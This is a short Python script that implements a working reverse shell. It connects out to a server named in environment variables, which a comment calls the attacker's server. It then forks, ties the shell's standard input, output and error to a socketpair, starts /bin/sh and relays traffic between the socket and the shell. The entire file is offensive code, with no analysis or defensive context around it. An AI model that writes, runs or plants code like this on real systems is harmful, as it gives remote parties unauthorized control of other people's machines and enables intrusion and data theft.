import os
import sys
import socket
import select

def forward_data(src_fd, dst_fd):
    try:
        data = os.read(src_fd, 1024)
        if data:
            os.write(dst_fd, data)
        else:
            # No data means the other end has closed the connection
            return False
    except OSError as e:
        print(f"Error while forwarding data: {e}")
        sys.exit(1)
    return True

def main():
    # Read server IP and port from environment variables
    SERVER_IP = os.getenv("REVERSE_SHELL_SERVER", "127.0.0.1")
    SERVER_PORT = int(os.getenv("REVERSE_SHELL_PORT", "4444"))

    try:
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect to the attacker's server
        sock.connect((SERVER_IP, SERVER_PORT))

        # Create socketpair for bidirectional communication
        socks = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)

        # Fork the process
        pid = os.fork()
        if pid == 0:
            # Child process
            os.close(socks[0].fileno())  

            # Redirect stdin, stdout, and stderr to the pipes
            os.dup2(socks[1].fileno(), sys.stdin.fileno())
            os.dup2(socks[1].fileno(), sys.stdout.fileno())
            os.dup2(socks[1].fileno(), sys.stderr.fileno())

            # Execute a shell
            os.execl("/bin/sh", "-i")
        else:
            # Parent process
            os.close(socks[1].fileno())

            # Use select to multiplex between the socket and the pipes
            while True:
                rlist, _, _ = select.select([sock, socks[0]], [], [])
                for r in rlist:
                    if r == sock:
                        if not forward_data(sock.fileno(), socks[0].fileno()):
                            return
                    elif r == socks[0]:
                        if not forward_data(socks[0].fileno(), sock.fileno()):
                            return

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()